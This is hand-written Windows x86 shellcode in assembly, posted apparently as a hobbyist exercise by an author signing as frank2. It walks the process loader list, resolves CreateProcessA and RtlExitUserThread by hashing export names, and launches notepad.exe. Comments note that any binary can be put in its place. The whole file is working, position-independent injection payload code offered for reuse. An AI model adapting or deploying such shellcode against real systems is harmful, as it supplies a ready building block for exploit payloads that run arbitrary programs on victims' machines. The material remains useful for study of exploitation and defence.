; Windows binary exec shellcode, 238 bytes.
; launches notepad (or a binary of your choosing if you modify the code :)
; first time writing windows shellcode by hand. I'm happy with it.
;
; frank2 <frank2 [!] dc949 [?] org>

   jmp   short trampOne

getFuncByHash:
   xor   eax,eax
   mov   al,0x30           ; ajkdsfljasldkfjalksdjfkla 
   mov   esi,fs:[eax]
   mov   esi,[esi+0xC]     
   mov   esi,[esi+0xC]

linkLoop:
   mov   esi,[esi]
   dec   [esp+8]
   jnz   linkLoop

   mov   esi,[esi+0x18]    ; image base 
   mov   edi,[esi+0x3C]    ; dos->e_lfanew 
   add   edi,esi
   mov   ecx,[edi+0x78]    ; export data 
   add   ecx,esi
   mov   ebx,[ecx+0x20]    ; AddressOfNames 
   add   ebx,esi
   xor   eax,eax
   dec   ebp
   mov   [ebp+1],ecx       ; angry about offsets :(  

searchForFunc:
   mov   edx,[ebx+eax*4]
   add   edx,esi
   mov   edi,0x554E4441

hashString:
   movzx ecx,[edx]
   test  ecx,ecx
   jz    short finishHash

rolRolFightDaPowa:
   xor   edi,ecx
   rol   edi,cl
   shr   ecx,1
   jnz   short rolRolFightDaPowa
   inc   edx
   jmp   hashString

finishHash:
   cmp   edi,[esp+4]
   jz    foundHash
   inc   eax
   jmp   short searchForFunc

foundHash:
   mov   ebx,[ebp+1]
   inc   ebp
   mov   edi,[ebx+0x1c]
   add   edi,esi
   mov   ebx,[ebx+0x24]
   add   ebx,esi
   movzx ebx,word ptr [ebx+eax*2]
   mov   ebx,[edi+ebx*4]
   add   ebx,esi
   ret   

trampOne:
   jmp   short dataOffset

beginCode:
   pop   ebp
   xor   eax,eax
   mov   al,0x50
   add   esp,eax           ; make some room so we don't smash our shellcode 

   mov   al,1              ; first link is ntdll 
   push  eax
   push  [ebp+0x10]
   call  getFuncByHash
   pop   eax
   pop   eax
   mov   [ebp+0xC],ebx     ; RtlExitUserThread 

   mov   al,2              ; second link is kernel32 
   push  eax
   push  [ebp+0x8]
   call  getFuncByHash
   pop   eax
   pop   eax
   mov   [ebp+0x4],ebx     ; CreateProcessA 

   lea   edx,[ebp+0x14]
   lea   edi,[ebp+0x33]
   mov   cl,0x45
   rep   stosb
   lea   edi,[ebp+0x34]

   ; begin CreateProcess call 
   push  edi
   push  edi
   push  ecx
   push  ecx
   push  ecx
   push  ecx
   push  ecx
   push  ecx
   push  ecx
   push  edx
   call  [ebp+0x4]

   ; quit dat shit 
   xor   eax,eax
   push  eax
   call  [ebp+0xC]

dataOffset:
   call  beginCode

   dd    0x554E4441        ; export data scratch
   dd    0x554E4441        ; CreateProcessA storage
   dd    0x14019035        ; CreateProcessA hash
   dd    0x554E4441        ; RtlExitUserThread storage
   dd    0x795D841E        ; RtlExitUserThread hash
   db    'C:\Windows\System32\notepad.exeZ'
